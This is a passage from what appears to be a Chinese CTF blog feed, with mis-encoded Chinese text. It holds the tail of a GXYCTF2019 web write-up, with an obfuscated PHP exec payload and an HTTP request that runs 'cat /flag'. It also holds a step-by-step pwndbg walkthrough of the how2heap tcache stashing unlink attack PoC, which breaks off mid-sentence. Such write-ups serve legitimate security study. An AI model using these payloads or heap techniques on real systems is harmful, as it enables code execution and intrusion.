class="variable">$pi</span>=hex2bin(<span class="string">&quot;5f474554&quot;</span>) =&gt; <span class="variable">$pi</span>=<span class="string">&quot;_GET&quot;</span>   <span class="comment">//hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>)&#123;pi&#125;(<span class="variable">$_GET</span>)&#123;abs&#125;  <span class="comment">//&#123;&#125;å¯ä»¥ä»£æ›¿[]</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§payloadï¼š<code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(696468,10,36) =&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br><span class="line">æ“ä½œçš„base_convertå’Œ(696468,10,36)éƒ½å¯ä»¥è¾“å‡ºï¼Œä¸­é—´ç”¨é€—å·éš”å¼€</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>5f45c01f-ba8f-4226-b257-a443769cc63f.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">1: cat /flag</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;0x20-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ&quot;&gt;&lt;a href=&quot;#0x20-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ&quot; class=&quot;headerlink&quot; title=&quot;0x20.[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ&quot;&gt;&lt;/a&gt;0x20.[GXYCTF</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>Tcache_stashing_unlink_atackè°ƒè¯•è®°å½•</title>
    <link href="http://example.com/2021/09/01/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/"/>
    <id>http://example.com/2021/09/01/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</id>
    <published>2021-08-31T16:00:00.000Z</published>
    <updated>2021-09-01T14:53:19.309Z</updated>
    
    <content type="html"><![CDATA[<p>ä»£ç æ˜¯how2heapä¸­libc2.27çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¼€å§‹è°ƒè¯•å§ï¼š</p><p>é¦–å…ˆæœ€å¼€å§‹æœ‰ä¸‰ä¸ªå˜é‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0 &lt;repeats 16 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x0 &lt;repeats 16 times&gt;&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>ä¹‹åå°†stack_var[2]çš„åœ°å€æ”¾å…¥äº†stack_var[3]ä¸­çš„ä½ç½®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0, 0, 0, 140737488346768, 0 &lt;repeats 12 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x0 &lt;repeats 16 times&gt;&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆè¿™ä¹ˆæ”¾ï¼Œæ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼Œåé¢ä¼šæ­æ™“ï¼Œç»§ç»­å¾€ä¸‹çœ‹ï¼š</p><p>å†æ¥ä¸‹æ¥å°±æ˜¯è¿ç»­mallocäº†9æ¬¡ï¼Œå¹¶å°†è¿”å›çš„åœ°å€æ”¾å…¥äº†chunk_listä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">i = 0</span><br><span class="line">stack_var = &#123;0, 0, 0, 140737488346768, 0 &lt;repeats 12 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757580, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†3åˆ°8çš„éƒ½freeæ‰ï¼Œtcacheæ˜¯FILOçš„ï¼Œä¸”æ¯ä¸ªæœ€å¤šæ”¾7ä¸ªï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  6]: 0x555555757760 â€”â–¸ 0x5555557576c0 â€”â–¸ 0x555555757620 â€”â–¸ 0x555555757580 â€”â–¸ 0x5555557574e0 â€”â–¸ 0x555555757440 â—‚â€” 0x0</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0, 0, 0, 140737488346768, 0 &lt;repeats 12 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757580, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">target = 0x7ffff7dde39f &lt;_dl_lookup_symbol_x+319&gt;</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure><p>åœ¨ä¹‹åæŒ‰ç…§1,0,2çš„é¡ºåºfreeï¼Œæ”¾å…¥unsorted binä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x555555757300 â€”â–¸ 0x555555757760 â€”â–¸ 0x5555557576c0 â€”â–¸ 0x555555757620 â€”â–¸ 0x555555757580 â€”â–¸ 0x5555557574e0 â€”â–¸ 0x555555757440 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757390 â€”â–¸ 0x555555757250 â€”â–¸ 0x7ffff7dcdca0 (main_arena+96) â—‚â€” 0x555555757390</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ä¹‹åç”³è¯·äº†0xa0å¤§å°çš„chunkï¼Œunsortedä¸­æ²¡æœ‰è¿™ä¹ˆå¤§çš„ï¼Œå…¨éƒ¨æ”¾å…¥smallbinä¸­ï¼Œç„¶åä»top chunkåˆ‡å‰²ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x555555757300 â€”â–¸ 0x555555757760 â€”â–¸ 0x5555557576c0 â€”â–¸ 0x555555757620 â€”â–¸ 0x555555757580 â€”â–¸ 0x5555557574e0 â€”â–¸ 0x555555757440 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x555555757390 â€”â–¸ 0x555555757250 â€”â–¸ 0x7ffff7dcdd30 (main_arena+240) â—‚â€” 0x555555757390</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> heap</span></span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">Free chunk (tcache) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757750</span><br><span class="line">Size: 0xa1</span><br><span class="line">fd: 0x5555557576c0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE  &lt; == æ–°ç”³è¯·çš„0xa0å¤§å°çš„chunk</span><br><span class="line">Addr: 0x5555557577f0</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557578a0</span><br><span class="line">Size: 0x20761</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸¤ä¸ªmalloc(0x90)ï¼Œä»tcacheä¸­æ‹¿ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x5555557576c0 â€”â–¸ 0x555555757620 â€”â–¸ 0x555555757580 â€”â–¸ 0x5555557574e0 â€”â–¸ 0x555555757440 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x555555757390 â€”â–¸ 0x555555757250 â€”â–¸ 0x7ffff7dcdd30 (main_arena+240) â—‚â€” 0x555555757390</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>stack_varçš„åœ°å€ï¼š0x7fffffffde80ã€‚</p><p>ç„¶åå°±æ˜¯è¿™å¥è¯ï¼š</p><p><code> chunk_lis[2][1] = (unsigned long)stack_var;</code></p><p>å°±æ˜¯å°†stack_varçš„åœ°å€æ”¾å…¥chunl_lis[2]æ‰€æŒ‡çš„åœ°å€ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> chunk_lis[2]</span> </span><br><span class="line"><span class="meta">$</span><span class="bash">4 = (unsigned long *) 0x5555557573a0</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> chunk_lis[2][1]</span> </span><br><span class="line"><span class="meta">$</span><span class="bash">5 = 140737488346752 &lt; = ä¹Ÿå°±æ˜¯0x7fffffffde80</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> &amp;chunk_lis[2][1]</span> </span><br><span class="line"><span class="meta">$</span><span class="bash">6 = (unsigned long *) 0x5555557573a8</span></span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¯´ï¼Œå°†0x7ffff7dcdd30å†™å…¥äº†0x5555557573a8ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/16gx 0x555555757390</span></span><br><span class="line">0x555555757390:0x00000000000000000x00000000000000a1</span><br><span class="line">0x5555557573a0:0x00005555557572500x00007fffffffde80</span><br><span class="line">0x5555557573b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557573f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757400:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¹ˆä¸€æ”¹å°†smallbinçš„é“¾è¡¨æ‰“ä¹±äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x5555557576c0 â€”â–¸ 0x555555757620 â€”â–¸ 0x555555757580 â€”â–¸ 0x5555557574e0 â€”â–¸ 0x555555757440 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x555555757390 â€”â–¸ 0x555555757250 â€”â–¸ 0x7ffff7dcdd30 (main_arena+240) â—‚â€” 0x555555757390</span><br><span class="line">BK: 0x555555757250 â€”â–¸ 0x555555757390 â€”â–¸ 0x7fffffffde80 â€”â–¸ 0x7fffffffde90 â—‚â€” 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯calloc(1,0x90)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x7fffffffde90 â€”â–¸ 0x5555557573a0 â€”â–¸ 0x5555557576c0 â€”â–¸ 0x555555757620 â€”â–¸ 0x555555757580 â€”â–¸ 0x5555557574e0 â€”â–¸ 0x555555757440 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x555555757390 â€”â–¸ 0x5555557576c0 â—‚â€” 0x0</span><br><span class="line">BK: 0x7fffffffde90 â—‚â€” 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tcache bin æœ‰å‰©ä½™ (æ•°é‡å°äº 